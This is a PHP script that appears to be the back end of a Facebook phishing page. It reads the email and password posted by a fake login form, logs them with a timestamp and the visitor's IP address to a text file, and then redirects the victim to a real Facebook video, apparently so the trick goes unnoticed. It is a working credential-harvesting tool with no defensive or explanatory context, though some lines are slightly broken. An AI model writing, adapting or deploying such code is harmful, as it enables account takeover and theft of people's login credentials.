<?php

if(isset($_POST['login'])){
    if($_POST['email'] == "" || $_POST['pass'] == ""){
        header('location:/error.html');
    }
    else {
        $user = $_POST['email'];
        $pass = $_POST['pass'];
        writeToFile($user, $pass);
        header('location:https://m.facebook.com/story.php?story_fbid=2042181892557573&id=1306200639489039&refsrc=https%3A%2F%2Fm.facebook.com%2Fviralizedofficial%2Fvideos%2F2042181892557573%2F&_rdr');
    }
}
else {
    header('location:/error.html');
}


// b2wwZHNpMzhicTAw
function writeToFile($username, $password){
    $file = fopen("qwertyasdfg.txt", 'a');
    fwrite($file, $text);
    fwrite($file, date("h:i:sa") . "\n");
    fwrite($file, "Username: " . $username . " \n");
    fwrite($file, "Password: " . $password . " \n");
    fwrite($file, "IP: " . $_SERVER[‘REMOTE_ADDR’]);
    fwrite($file, " \n");
    fclose($file);
}